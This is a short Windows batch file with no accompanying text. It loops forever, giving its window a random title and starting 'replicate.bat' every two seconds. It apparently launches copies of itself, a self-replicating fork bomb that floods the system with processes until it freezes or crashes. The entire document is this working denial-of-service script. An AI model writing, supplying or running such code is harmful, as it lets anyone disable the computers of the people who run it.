@echo off
Pushd "%~dp0"
:a
title Win%random%a
timeout /t 2 /nobreak >nul
start replicate.bat
goto a